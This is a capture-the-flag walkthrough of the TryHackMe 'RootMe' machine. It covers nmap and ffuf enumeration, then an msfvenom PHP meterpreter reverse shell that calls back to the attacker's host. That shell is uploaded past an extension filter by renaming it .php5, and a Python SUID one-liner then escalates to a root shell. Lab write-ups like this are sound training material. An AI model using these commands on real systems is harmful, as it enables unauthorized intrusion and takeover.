# RootMe

## Reconnaissance
Let's start the enumeration with scanning the ports, which we can do with ```nmap```. This can be done with the command ```nmap -A -T4 <ip>```.

![nmap](https://github.com/nicolai-h/tryhackme/blob/main/root_me/images/nmap.png)

As we can see there are two ports open, port 22 for ssh and port 80 for http. The SSH version running is OpenSSH 7.6p1 and the server is an Apache server running on ubuntu. For further enumeration we can use ```ffuf``` with the command ```ffuf -w /usr/share/wordlists/dirb/big.txt -u "http://<ip>/FUZZ"```.

![ffuf](https://github.com/nicolai-h/tryhackme/blob/main/root_me/images/fuzzing.png)

The output shows us that that there are two hidden directories, panel and uploads. When entering <ip>/panel we can see that there is an upload form.

![panel](https://github.com/nicolai-h/tryhackme/blob/main/root_me/images/panel.png)

## Getting a shell
Lets see if we can upload a reverse shell through it. We can create an reverse shell with the command ``` msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php```. When trying to upload our reverse shell we can see that there is an filter in place that does not accept ```.php``` files. We can try to get around the filter by changing the extension to ```.php5```. That worked! Now we can go to <ip>/uploads and run the file while we try to catch the reverse shell. We can catch the reverse shell with metasploit (msfconsole). I used the payload ```php/meterpreter_reverse_tcp```. Set the options LHOST <your ip> and LPORT <choosen port>.

![msf](https://github.com/nicolai-h/tryhackme/blob/main/root_me/images/msf.png)

## Privilege escalation
Now that we have gotten onto the computer we can start with the privilege escalation, we can start the enumeration with ```find / -perm -u=s -type f 2>/dev/null``` which will find the executable files with the SUID bit set.

![priv_esc1](https://github.com/nicolai-h/tryhackme/blob/main/root_me/images/priv_esc.png)

As we can see /usr/bin/python has the SUID bit set, we can use this to escalate our privileges with the command ```/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'```

![priv_esc2](https://github.com/nicolai-h/tryhackme/blob/main/root_me/images/priv_esc2.png)

And there we have it!
